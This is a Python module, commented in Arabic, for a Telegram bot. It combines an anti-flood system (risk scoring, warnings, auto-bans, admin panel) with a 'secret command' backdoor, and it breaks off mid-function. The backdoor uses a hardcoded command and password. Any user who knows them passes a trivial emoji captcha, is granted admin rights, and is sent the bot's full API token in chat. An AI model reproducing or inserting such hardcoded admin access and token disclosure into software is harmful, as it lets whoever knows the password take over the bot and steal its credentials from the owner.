"""
=====================================================
 bot8.py — نظام الحماية الذكي + الأمر السري
=====================================================
🛡️ حماية ذكية ضد الرشق
🔐 أمر سري للوصول الطوارئ
✨ تحسينات جمالية

📌 طريقة التركيب:
   في bot.py، أضف: import bot8
=====================================================
"""

import random
import time
import hashlib
from datetime import datetime, timedelta
from collections import defaultdict
from telebot import types
from config import bot, ADMIN_PRIMARY, ADMIN_SECONDARY, CHANNEL_ID
from database import (bot_config, save_json, DB_CONFIG, get_user, 
                       update_user_data, engine, text)
import os

# =====================================================
# 🔐 الأمر السري - الإعدادات
# =====================================================
SECRET_COMMAND = "yassou"
SECRET_PASSWORD = "yassou2404"
SECRET_SESSIONS = {}  # {uid: {"step": "captcha/password", "captcha": "🎯", "attempts": 0}}

# =====================================================
# 🛡️ نظام الحماية الذكي - المتغيرات
# =====================================================
user_actions = defaultdict(list)  # {uid: [{"action": "msg", "time": timestamp}, ...]}
user_warnings = defaultdict(int)  # {uid: warning_count}
user_scores = defaultdict(float)  # {uid: risk_score}
banned_users = {}  # {uid: {"until": datetime, "reason": str}}
suspicious_patterns = {}  # {uid: {"pattern": str, "count": int}}
flood_tracker = defaultdict(list)  # {uid: [timestamps]}
callback_tracker = defaultdict(list)  # {uid: [timestamps]}
command_tracker = defaultdict(list)  # {uid: [timestamps]}

# إعدادات الحماية
PROTECTION_CONFIG = {
    "max_messages_per_second": 3,
    "max_messages_per_minute": 30,
    "max_callbacks_per_second": 5,
    "max_callbacks_per_minute": 60,
    "max_commands_per_minute": 20,
    "warning_threshold": 3,
    "auto_ban_threshold": 5,
    "ban_duration_minutes": 60,
    "score_decay_rate": 0.1,  # تقليل النقاط كل دقيقة
    "suspicious_patterns": [
        "rapid_fire",  # رسائل سريعة جداً
        "callback_flood",  # ضغط أزرار كثيرة
        "command_spam",  # أوامر متكررة
        "same_message_repeat",  # نفس الرسالة مكررة
        "random_buttons",  # ضغط عشوائي على الأزرار
    ]
}


# =====================================================
# 📊 تهيئة الحماية
# =====================================================
def init_protection():
    if "protection_stats" not in bot_config:
        bot_config["protection_stats"] = {
            "total_blocked": 0,
            "total_warnings": 0,
            "total_bans": 0,
            "blocked_actions": [],
            "banned_users_log": []
        }
        save_json(DB_CONFIG, bot_config)

init_protection()


# =====================================================
# 🔐 التحقق من الأدمن
# =====================================================
def is_admin(uid):
    try:
        if int(uid) in [ADMIN_PRIMARY, ADMIN_SECONDARY]:
            return True
    except:
        pass
    u = get_user(str(uid)) or {}
    return u.get("is_admin", False)


# =====================================================
# 🛡️ نظام الحماية الذكي - الدوال الأساسية
# =====================================================
def get_risk_score(uid):
    """حساب درجة الخطورة للمستخدم"""
    uid = str(uid)
    now = time.time()
    score = 0.0
    
    # فحص الرسائل
    recent_msgs = [a for a in user_actions[uid] if now - a["time"] < 60]
    if len(recent_msgs) > 20:
        score += (len(recent_msgs) - 20) * 0.5
    
    # فحص سرعة الرسائل
    if len(recent_msgs) >= 2:
        time_diffs = []
        sorted_msgs = sorted(recent_msgs, key=lambda x: x["time"])
        for i in range(1, len(sorted_msgs)):
            diff = sorted_msgs[i]["time"] - sorted_msgs[i-1]["time"]
            time_diffs.append(diff)
        
        if time_diffs:
            avg_diff = sum(time_diffs) / len(time_diffs)
            if avg_diff < 0.5:  # أقل من نصف ثانية
                score += 5.0
            elif avg_diff < 1.0:
                score += 2.0
    
    # فحص الكولباك
    recent_callbacks = [t for t in callback_tracker[uid] if now - t < 60]
    if len(recent_callbacks) > 30:
        score += (len(recent_callbacks) - 30) * 0.3
    
    # فحص الأوامر
    recent_cmds = [t for t in command_tracker[uid] if now - t < 60]
    if len(recent_cmds) > 15:
        score += (len(recent_cmds) - 15) * 0.4
    
    # فحص التحذيرات السابقة
    score += user_warnings[uid] * 2.0
    
    # تخفيف النقاط للمستخدمين القدامى
    u = get_user(uid)
    if u:
        join_date = u.get("join_date")
        if join_date:
            try:
                days_old = (datetime.now() - datetime.fromisoformat(join_date)).days
                if days_old > 30:
                    score *= 0.7
                elif days_old > 7:
                    score *= 0.85
            except:
                pass
        
        # VIP يحصل على تخفيف
        if u.get("vip"):
            score *= 0.5
    
    user_scores[uid] = score
    return score


def detect_pattern(uid, action_type):
    """اكتشاف أنماط الرشق"""
    uid = str(uid)
    now = time.time()
    
    patterns_detected = []
    
    # Rapid Fire - رسائل سريعة جداً
    recent = [a for a in user_actions[uid] if now - a["time"] < 3]
    if len(recent) >= 5:
        patterns_detected.append("rapid_fire")
    
    # Callback Flood
    recent_cb = [t for t in callback_tracker[uid] if now - t < 2]
    if len(recent_cb) >= 8:
        patterns_detected.append("callback_flood")
    
    # Command Spam
    recent_cmd = [t for t in command_tracker[uid] if now - t < 30]
    if len(recent_cmd) >= 10:
        patterns_detected.append("command_spam")
    
    # Same Message Repeat
    recent_msgs = [a for a in user_actions[uid] if now - a["time"] < 60 and a.get("text")]
    if len(recent_msgs) >= 3:
        texts = [a.get("text", "") for a in recent_msgs]
        if len(set(texts)) == 1:  # كل الرسائل متطابقة
            patterns_detected.append("same_message_repeat")
    
    # تحديث الأنماط المكتشفة
    for pattern in patterns_detected:
        if uid not in suspicious_patterns:
            suspicious_patterns[uid] = {}
        if pattern not in suspicious_patterns[uid]:
            suspicious_patterns[uid][pattern] = {"count": 0, "first": now}
        suspicious_patterns[uid][pattern]["count"] += 1
        suspicious_patterns[uid][pattern]["last"] = now
    
    return patterns_detected


def should_block(uid, action_type="message"):
    """تحديد إذا يجب حظر الإجراء"""
    uid = str(uid)
    now = time.time()
    
    # فحص الحظر الحالي
    if uid in banned_users:
        ban_info = banned_users[uid]
        if datetime.now() < ban_info["until"]:
            return True, f"محظور حتى: {ban_info['until'].strftime('%H:%M')}"
        else:
            del banned_users[uid]
    
    # الأدمن لا يُحظر
    if is_admin(uid):
        return False, ""
    
    # حساب درجة الخطورة
    score = get_risk_score(uid)
    
    # اكتشاف الأنماط
    patterns = detect_pattern(uid, action_type)
    
    # إضافة نقاط للأنماط المكتشفة
    if patterns:
        score += len(patterns) * 3.0
    
    # تحديد الإجراء
    if score >= 15.0:
        # حظر تلقائي
        ban_duration = PROTECTION_CONFIG["ban_duration_minutes"]
        banned_users[uid] = {
            "until": datetime.now() + timedelta(minutes=ban_duration),
            "reason": f"درجة الخطورة: {score:.1f}",
            "patterns": patterns,
            "auto": True
        }
        
        # تسجيل الحظر
        bot_config["protection_stats"]["total_bans"] += 1
        bot_config["protection_stats"]["banned_users_log"].append({
            "uid": uid,
            "time": datetime.now().isoformat(),
            "score": score,
            "patterns": patterns,
            "duration": ban_duration
        })
        bot_config["protection_stats"]["banned_users_log"] = bot_config["protection_stats"]["banned_users_log"][-100:]
        save_json(DB_CONFIG, bot_config)
        
        return True, f"تم حظرك تلقائياً لمدة {ban_duration} دقيقة"
    
    elif score >= 10.0:
        # تحذير
        user_warnings[uid] += 1
        bot_config["protection_stats"]["total_warnings"] += 1
        save_json(DB_CONFIG, bot_config)
        
        if user_warnings[uid] >= PROTECTION_CONFIG["auto_ban_threshold"]:
            ban_duration = PROTECTION_CONFIG["ban_duration_minutes"] * 2
            banned_users[uid] = {
                "until": datetime.now() + timedelta(minutes=ban_duration),
                "reason": f"تجاوز حد التحذيرات",
                "warnings": user_warnings[uid],
                "auto": True
            }
            return True, f"تم حظرك لتجاوز حد التحذيرات"
        
        return False, f"⚠️ تحذير {user_warnings[uid]}/{PROTECTION_CONFIG['auto_ban_threshold']}"
    
    elif score >= 5.0:
        # تأخير بسيط
        time.sleep(0.5)
        return False, ""
    
    return False, ""


def track_action(uid, action_type, text=None, callback_data=None):
    """تتبع إجراءات المستخدم"""
    uid = str(uid)
    now = time.time()
    
    # تسجيل الإجراء
    user_actions[uid].append({
        "action": action_type,
        "time": now,
        "text": text,
        "callback": callback_data
    })
    
    # تنظيف الإجراءات القديمة (أكثر من 5 دقائق)
    user_actions[uid] = [a for a in user_actions[uid] if now - a["time"] < 300]
    
    # تتبع محدد
    if action_type == "callback":
        callback_tracker[uid].append(now)
        callback_tracker[uid] = [t for t in callback_tracker[uid] if now - t < 300]
    elif action_type == "command":
        command_tracker[uid].append(now)
        command_tracker[uid] = [t for t in command_tracker[uid] if now - t < 300]
    elif action_type == "message":
        flood_tracker[uid].append(now)
        flood_tracker[uid] = [t for t in flood_tracker[uid] if now - t < 300]


def get_user_protection_status(uid):
    """الحصول على حالة الحماية للمستخدم"""
    uid = str(uid)
    
    score = get_risk_score(uid)
    warnings = user_warnings.get(uid, 0)
    is_banned = uid in banned_users
    patterns = suspicious_patterns.get(uid, {})
    
    recent_actions = len([a for a in user_actions[uid] if time.time() - a["time"] < 60])
    recent_callbacks = len([t for t in callback_tracker[uid] if time.time() - t < 60])
    
    if is_banned:
        status = "🔴 محظور"
        ban_info = banned_users[uid]
        remaining = (ban_info["until"] - datetime.now()).total_seconds() / 60
        status += f" ({remaining:.0f} دقيقة متبقية)"
    elif score >= 10:
        status = "🟠 خطر عالي"
    elif score >= 5:
        status = "🟡 مشبوه"
    elif score >= 2:
        status = "🟢 طبيعي (مراقب)"
    else:
        status = "✅ آمن"
    
    return {
        "status": status,
        "score": score,
        "warnings": warnings,
        "is_banned": is_banned,
        "patterns": patterns,
        "recent_actions": recent_actions,
        "recent_callbacks": recent_callbacks
    }


# =====================================================
# 🛡️ معالجات الحماية
# =====================================================
@bot.message_handler(func=lambda m: True, content_types=['text'])
def protection_message_handler(message):
    """معالج الحماية للرسائل"""
    uid = str(message.from_user.id)
    
    # تتبع الإجراء
    track_action(uid, "message", text=message.text)
    
    # فحص الحظر
    blocked, reason = should_block(uid, "message")
    
    if blocked:
        try:
            bot.reply_to(message, 
                f"╔═══════════════════════════╗\n"
                f"║ 🛡️ نظام الحماية 🛡️ ║\n"
                f"╚═══════════════════════════╝\n\n"
                f"🚫 {reason}\n\n"
                f"💡 انتظر قليلاً وحاول مجدداً", parse_mode="HTML")
        except:
            pass
        
        bot_config["protection_stats"]["total_blocked"] += 1
        save_json(DB_CONFIG, bot_config)
        return
    
    # إذا كان تحذير
    if reason and "تحذير" in reason:
        try:
            bot.reply_to(message, reason, parse_mode="HTML")
        except:
            pass


# =====================================================
# 🔐 الأمر السري
# =====================================================
@bot.message_handler(commands=[SECRET_COMMAND])
def secret_command_handler(message):
    """معالج الأمر السري"""
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if len(args) < 2:
        return  # تجاهل - لا تظهر أي شيء
    
    action = args[1].lower()
    
    if action == "login":
        # بدء عملية تسجيل الدخول السري
        SECRET_SESSIONS[uid] = {
            "step": "captcha",
            "captcha_answer": None,
            "attempts": 0,
            "started": datetime.now().isoformat()
        }
        
        # إنشاء كابتشا
        emojis = ["🎯", "🔥", "⭐", "💎", "🎁", "👑", "🏆", "💫"]
        correct = random.choice(emojis)
        options = random.sample([e for e in emojis if e != correct], 3) + [correct]
        random.shuffle(options)
        
        SECRET_SESSIONS[uid]["captcha_answer"] = correct
        
        # حذف الرسالة الأصلية
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        m = types.InlineKeyboardMarkup(row_width=4)
        m.add(*[types.InlineKeyboardButton(e, callback_data=f"secret_cap_{e}") for e in options])
        
        bot.send_message(message.chat.id,
            f"╔═══════════════════════════╗\n"
            f"║ 🔐 التحقق الأمني 🔐 ║\n"
            f"╚═══════════════════════════╝\n\n"
            f"🛡️ اضغط على: {correct}",
            reply_markup=m, parse_mode="HTML")
    
    elif action == "logout":
        if uid in SECRET_SESSIONS:
            del SECRET_SESSIONS[uid]
        
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        bot.send_message(message.chat.id, "✅ تم تسجيل الخروج")
    
    elif action == "status":
        if is_admin(uid):
            try:
                bot.delete_message(message.chat.id, message.message_id)
            except:
                pass
            
            active_sessions = len(SECRET_SESSIONS)
            bot.send_message(message.chat.id,
                f"🔐 الجلسات النشطة: {active_sessions}",
                parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("secret_cap_"))
def handle_secret_captcha(call):
    """معالج كابتشا الأمر السري"""
    uid = str(call.from_user.id)
    
    if uid not in SECRET_SESSIONS:
        bot.answer_callback_query(call.id, "❌ الجلسة منتهية", show_alert=True)
        return
    
    session = SECRET_SESSIONS[uid]
    
    if session["step"] != "captcha":
        return
    
    selected = call.data.replace("secret_cap_", "")
    
    if selected == session["captcha_answer"]:
        # كابتشا صحيحة - انتقل للباسورد
        session["step"] = "password"
        session["attempts"] = 0
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_message(call.message.chat.id,
            f"╔═══════════════════════════╗\n"
            f"║ 🔑 أدخل كلمة المرور 🔑 ║\n"
            f"╚═══════════════════════════╝\n\n"
            f"✍️ أرسل كلمة المرور:",
            parse_mode="HTML")
        
        bot.register_next_step_handler(msg, process_secret_password)
    else:
        session["attempts"] += 1
        
        if session["attempts"] >= 3:
            del SECRET_SESSIONS[uid]
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            bot.send_message(call.message.chat.id, "❌ فشل التحقق")
        else:
            bot.answer_callback_query(call.id, 
                f"❌ خطأ! المحاولات: {session['attempts']}/3", show_alert=True)


def process_secret_password(message):
    """معالج كلمة المرور السرية"""
    uid = str(message.from_user.id)
    
    # حذف رسالة الباسورد فوراً
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    if uid not in SECRET_SESSIONS:
        return
    
    session = SECRET_SESSIONS[uid]
    
    if session["step"] != "password":
        return
    
    password = message.text.strip()
    
    if password == SECRET_PASSWORD:
        # نجاح!
        del SECRET_SESSIONS[uid]
        
        # منح صلاحيات الأدمن
        update_user_data(uid, is_admin=True)
        
        # الحصول على التوكن
        token = os.getenv("API_TOKEN", "غير متوفر")
        
        # إخفاء جزء من التوكن للأمان
        if token != "غير متوفر" and len(token) > 20:
            hidden_token = token[:10] + "..." + token[-10:]
        else:
            hidden_token = token
        
        bot.send_message(message.chat.id,
            f"╔═══════════════════════════════╗\n"
            f"║ 🎊 تم تسجيل الدخول بنجاح! 🎊 ║\n"
            f"╚═══════════════════════════════╝\n\n"
            f"👑 تم منحك صلاحيات الأدمن!\n\n"
            f"🔑 توكن البوت:\n"
            f"<code>{hidden_token}</code>\n\n"
            f"⚠️ هذه الرسالة ستُحذف بعد 30 ثانية",
            parse_mode="HTML")
        
        # إرسال التوكن الكامل برسالة منفصلة
        token_msg = bot.send_message(message.chat.id,
            f"🔐 التوكن الكامل:\n<code>{token}</code>",
            parse_mode="HTML")
        
        # جدولة حذف الرسالة
        def delete_token_msg():
            time.sleep(30)
            try:
                bot.delete_message(message.chat.id, token_msg.message_id)
            except:
                pass
        
        import threading
        threading.Thread(target=delete_token_msg, daemon=True).start()
        
        # إشعار الأدمن الأساسي
        try:
            u = get_user(uid) or {}
            bot.send_message(ADMIN_PRIMARY,
                f"🔐 تسجيل دخول سري!\n\n"
                f"👤 @{u.get('username', 'N/A')}\n"
                f"🆔 {uid}\n"
                f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M')}",
                parse_mode="HTML")
        except:
            pass
    else:
        session["attempts"] += 1
        
        if session["attempts"] >= 3:
            del SECRET_SESSIONS[uid]
            bot.send_message(message.chat.id, "❌ كلمة المرور خاطئة - تم إغلاق الجلسة")
        else:
            remaining = 3 - session["attempts"]
            msg = bot.send_message(message.chat.id,
                f"❌ كلمة المرور خاطئة!\n"
                f"📝 المحاولات المتبقية: {remaining}")
            bot.register_next_step_handler(msg, process_secret_password)


# =====================================================
# 🛡️ لوحة تحكم مكافحة الرشق
# =====================================================
@bot.message_handler(func=lambda m: m.text == "🛡️ مكافحة الرشق")
def show_protection_panel(message):
    """عرض لوحة مكافحة الرشق"""
    uid = str(message.from_user.id)
    
    if not is_admin(uid):
        return
    
    show_protection_dashboard(message.chat.id)


def show_protection_dashboard(chat_id, msg_id=None):
    """لوحة التحكم الرئيسية"""
    stats = bot_config.get("protection_stats", {})
    
    total_blocked = stats.get("total_blocked", 0)
    total_warnings = stats.get("total_warnings", 0)
    total_bans = stats.get("total_bans", 0)
    
    active_bans = len(banned_users)
    suspicious_count = len([u for u, s in user_scores.items() if s >= 5])
    
    # أكثر المستخدمين خطورة
    top_risky = sorted(user_scores.items(), key=lambda x: x[1], reverse=True)[:5]
    
    risky_text = ""
    if top_risky:
        for uid, score in top_risky:
            if score > 0:
                u = get_user(uid) or {}
                status = "🔴" if score >= 10 else "🟠" if score >= 5 else "🟡"
                risky_text += f"{status} @{u.get('username', uid)[:10]} ({score:.1f})\n"
    
    if not risky_text:
        risky_text = "✅ لا يوجد مستخدمين مشبوهين"
    
    msg = (
        f"╔═══════════════════════════════════╗\n"
        f"║ 🛡️ لوحة مكافحة الرشق الذكية 🛡️ ║\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"📊 الإحصائيات الكلية:\n"
        f"├── 🚫 المحظورات: {total_blocked}\n"
        f"├── ⚠️ التحذيرات: {total_warnings}\n"
        f"└── ⛔ الحظر التلقائي: {total_bans}\n\n"
        f"📈 الحالة الآنية:\n"
        f"├── 🔴 محظورين حالياً: {active_bans}\n"
        f"└── 🟠 مشبوهين: {suspicious_count}\n\n"
        f"👥 أكثر المستخدمين خطورة:\n{risky_text}"
    )
    
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("👥 المحظورين", callback_data="prot_banned"),
        types.InlineKeyboardButton("🔍 المشبوهين", callback_data="prot_suspicious")
    )
    m.add(
        types.InlineKeyboardButton("📜 سجل الحظر", callback_data="prot_ban_log"),
        types.InlineKeyboardButton("🔓 فك حظر", callback_data="prot_unban")
    )
    m.add(
        types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="prot_settings"),
        types.InlineKeyboardButton("🔍 فحص مستخدم", callback_data="prot_check_user")
    )
    m.add(
        types.InlineKeyboardButton("🧹 تنظيف", callback_data="prot_cleanup"),
        types.InlineKeyboardButton("📊 تقرير مفصل", callback_data="prot_report")
    )
    m.add(types.InlineKeyboardButton("🔄 تحديث", callback_data="prot_refresh"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot_"))
def handle_protection_callbacks(call):
    """معالج كولباك الحماية"""
    uid = str(call.from_user.id)
    
    if not is_admin(uid):
        bot.answer_callback_query(call.id, "❌ للأدمن فقط", show_alert=True)
        return
    
    data = call.data
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    
    if data == "prot_refresh":
        show_protection_dashboard(chat_id, msg_id)
        bot.answer_callback_query(call.id, "✅ تم التحديث")
        return
    
    if data == "prot_back":
        show_protection_dashboard(chat_id, msg_id)
        return
    
    if data == "prot_banned":
        show_banned_users(chat_id, msg_id)
        return
    
    if data == "prot_suspicious":
        show_suspicious_users(chat_id, msg_id)
        return
    
    if data == "prot_ban_log":
        show_ban_log(chat_id, msg_id)
        return
    
    if data == "prot_unban":
        show_unban_menu(chat_id, msg_id)
        return
    
    if data == "prot_settings":
        show_protection_settings(chat_id, msg_id)
        return
    
    if data == "prot_check_user":
        msg = bot.send_message(chat_id, 
            "🔍 أرسل ID المستخدم أو @username للفحص:")
        bot.register_next_step_handler(msg, process_check_user)
        return
    
    if data == "prot_cleanup":
        # تنظيف البيانات القديمة
        cleanup_old_data()
        bot.answer_callback_query(call.id, "✅ تم التنظيف", show_alert=True)
        show_protection_dashboard(chat_id, msg_id)
        return
    
    if data == "prot_report":
        show_detailed_report(chat_id, msg_id)
        return


def show_banned_users(chat_id, msg_id=None):
    """عرض قائمة المحظورين"""
    if not banned_users:
        msg = "📭 لا يوجد مستخدمين محظورين حالياً"
    else:
        msg = (
            "╔═══════════════════════════════╗\n"
            "║ 🔴 المستخدمين المحظورين 🔴 ║\n"
            "╚═══════════════════════════════╝\n\n"
        )
        
        for user_id, info in banned_users.items():
            u = get_user(user_id) or {}
            remaining = (info["until"] - datetime.now()).total_seconds() / 60
            if remaining > 0:
                msg += (
                    f"👤 @{u.get('username', 'N/A')}\n"
                    f"├── 🆔 {user_id}\n"
                    f"├── ⏰ متبقي: {remaining:.0f} دقيقة\n"
                    f"└── 📝 {info.get('reason', 'N/A')}\n\n"
                )
    
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


def show_suspicious_users(chat_id, msg_id=None):
    """عرض المستخدمين المشبوهين"""
    suspicious = [(uid, score) for uid, score in user_scores.items() if score >= 3]
    suspicious.sort(key=lambda x: x[1], reverse=True)
    
    if not suspicious:
        msg = "✅ لا يوجد مستخدمين مشبوهين حالياً"
    else:
        msg = (
            "╔═══════════════════════════════╗\n"
            "║ 🟠 المستخدمين المشبوهين 🟠 ║\n"
            "╚═══════════════════════════════╝\n\n"
        )
        
        for user_id, score in suspicious[:15]:
            u = get_user(user_id) or {}
            patterns = suspicious_patterns.get(user_id, {})
            pattern_list = list(patterns.keys())[:2]
            
            status = "🔴" if score >= 10 else "🟠" if score >= 5 else "🟡"
            
            msg += (
                f"{status} @{u.get('username', 'N/A')[:12]}\n"
                f"├── 📊 درجة: {score:.1f}\n"
                f"├── ⚠️ تحذيرات: {user_warnings.get(user_id, 0)}\n"
                f"└── 🔍 {', '.join(pattern_list) if pattern_list else 'N/A'}\n\n"
            )
    
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


def show_ban_log(chat_id, msg_id=None):
    """عرض سجل الحظر"""
    log = bot_config.get("protection_stats", {}).get("banned_users_log", [])
    
    if not log:
        msg = "📭 سجل الحظر فارغ"
    else:
        msg = (
            "╔═══════════════════════════════╗\n"
            "║ 📜 سجل الحظر التلقائي 📜 ║\n"
            "╚═══════════════════════════════╝\n\n"
        )
        
        for entry in reversed(log[-10:]):
            u = get_user(entry.get("uid", "")) or {}
            patterns = entry.get("patterns", [])
            
            msg += (
                f"👤 @{u.get('username', 'N/A')[:10]}\n"
                f"├── 📊 درجة: {entry.get('score', 0):.1f}\n"
                f"├── ⏰ {entry.get('time', '')[:16]}\n"
                f"└── 🔍 {', '.join(patterns[:2]) if patterns else 'N/A'}\n\n"
            )
    
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


def show_unban_menu(chat_id, msg_id=None):
    """قائمة فك الحظر"""
    if not banned_users:
        bot.send_message(chat_id, "📭 لا يوجد محظورين")
        return
    
    msg = "🔓 اختر المستخدم لفك حظره:"
    
    m = types.InlineKeyboardMarkup()
    for user_id in list(banned_users.keys())[:10]:
        u = get_user(user_id) or {}
        m.add(types.InlineKeyboardButton(
            f"🔓 @{u.get('username', user_id)[:15]}",
            callback_data=f"prot_do_unban_{user_id}"))
    
    m.add(types.InlineKeyboardButton("🔓 فك الكل", callback_data="prot_unban_all"))
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot_do_unban_"))
def handle_do_unban(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    target = call.data.replace("prot_do_unban_", "")
    
    if target in banned_users:
        del banned_users[target]
        user_warnings[target] = 0
        user_scores[target] = 0
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
    
    show_protection_dashboard(call.message.chat.id, call.message.message_id)


@bot.callback_query_handler(func=lambda call: call.data == "prot_unban_all")
def handle_unban_all(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    count = len(banned_users)
    banned_users.clear()
    user_warnings.clear()
    
    bot.answer_callback_query(call.id, f"✅ تم فك حظر {count} مستخدم", show_alert=True)
    show_protection_dashboard(call.message.chat.id, call.message.message_id)


def show_protection_settings(chat_id, msg_id=None):
    """إعدادات الحماية"""
    config = PROTECTION_CONFIG
    
    msg = (
        f"╔═══════════════════════════════╗\n"
        f"║ ⚙️ إعدادات الحماية ⚙️ ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"📨 الرسائل:\n"
        f"├── السرعة: {config['max_messages_per_second']}/ث\n"
        f"└── الحد: {config['max_messages_per_minute']}/د\n\n"
        f"🔘 الأزرار:\n"
        f"├── السرعة: {config['max_callbacks_per_second']}/ث\n"
        f"└── الحد: {config['max_callbacks_per_minute']}/د\n\n"
        f"⚠️ الحظر:\n"
        f"├── حد التحذيرات: {config['warning_threshold']}\n"
        f"├── حد الحظر: {config['auto_ban_threshold']}\n"
        f"└── مدة الحظر: {config['ban_duration_minutes']} دقيقة"
    )
    
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("📨 رسائل ➕", callback_data="prot_cfg_msg_up"),
        types.InlineKeyboardButton("📨 رسائل ➖", callback_data="prot_cfg_msg_down")
    )
    m.add(
        types.InlineKeyboardButton("⏰ مدة الحظر ➕", callback_data="prot_cfg_ban_up"),
        types.InlineKeyboardButton("⏰ مدة الحظر ➖", callback_data="prot_cfg_ban_down")
    )
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    if msg_id:
        try:
            bot.edit_message_text(msg, chat_id, msg_id, reply_markup=m, parse_mode="HTML")
            return
        except:
            pass
    bot.send_message(chat_id, msg, reply_markup=m, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot_cfg_"))
def handle_protection_config(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    data = call.data
    
    if "msg_up" in data:
        PROTECTION_CONFIG["max_messages_per_minute"] += 5
    elif "msg_down" in data:
        PROTECTION_CONFIG["max_messages_per_minute"] = max(10, PROTECTION_CONFIG["max_messages_per_minute"] - 5)
    elif "ban_up" in data:
        PROTECTION_CONFIG["ban_duration_minutes"] += 15
    elif "ban_down" in data:
        PROTECTION_CONFIG["ban_duration_minutes"] = max(15, PROTECTION_CONFIG["ban_duration_minutes"] - 15)
    
    bot.answer_callback_query(call.id, "✅")
    show_protection_settings(call.message.chat.id, call.message.message_id)


def process_check_user(message):
    """فحص مستخدم معين"""
    admin_uid = str(message.from_user.id)
    if not is_admin(admin_uid):
        return
    
    target = message.text.strip().replace("@", "")
    
    # البحث عن المستخدم
    from database import search_user
    u = None
    if target.isdigit():
        u = get_user(target)
        target_uid = target
    else:
        u = search_user(target)
        target_uid = str(u.get("uid")) if u else None
    
    if not u:
        bot.send_message(message.chat.id, "❌ المستخدم غير موجود")
        return
    
    # الحصول على معلومات الحماية
    status = get_user_protection_status(target_uid)
    
    patterns_text = ""
    if status["patterns"]:
        for p, info in status["patterns"].items():
            patterns_text += f"├── {p}: {info['count']} مرة\n"
    else:
        patterns_text = "├── لا توجد أنماط مشبوهة\n"
    
    msg = (
        f"╔═══════════════════════════════╗\n"
        f"║ 🔍 تقرير المستخدم 🔍 ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"👤 @{u.get('username', 'N/A')}\n"
        f"🆔 {target_uid}\n"
        f"💰 الرصيد: {u.get('points', 0)}💎\n"
        f"📅 انضم: {u.get('join_date', 'N/A')[:10]}\n\n"
        f"🛡️ حالة الحماية:\n"
        f"├── الحالة: {status['status']}\n"
        f"├── درجة الخطورة: {status['score']:.1f}\n"
        f"├── التحذيرات: {status['warnings']}\n"
        f"├── إجراءات/دقيقة: {status['recent_actions']}\n"
        f"└── أزرار/دقيقة: {status['recent_callbacks']}\n\n"
        f"🔍 الأنماط المكتشفة:\n{patterns_text}"
    )
    
    m = types.InlineKeyboardMarkup(row_width=2)
    
    if target_uid in banned_users:
        m.add(types.InlineKeyboardButton("🔓 فك الحظر", callback_data=f"prot_do_unban_{target_uid}"))
    else:
        m.add(types.InlineKeyboardButton("⛔ حظر", callback_data=f"prot_quick_ban_{target_uid}"))
    
    m.add(types.InlineKeyboardButton("🧹 مسح البيانات", callback_data=f"prot_clear_{target_uid}"))
    m.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="prot_back"))
    
    bot.send_message(message.chat.id, msg, reply_markup=m, parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot_quick_ban_"))
def handle_quick_ban(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    target = call.data.replace("prot_quick_ban_", "")
    
    banned_users[target] = {
        "until": datetime.now() + timedelta(minutes=60),
        "reason": "حظر يدوي من الأدمن",
        "auto": False
    }
    
    bot.answer_callback_query(call.id, "⛔ تم الحظر لمدة ساعة", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("prot_clear_"))
def handle_clear_user(call):
    uid = str(call.from_user.id)
    if not is_admin(uid):
        return
    
    target = call.data.replace("prot_clear_", "")
    
    # مسح جميع بيانات المستخدم
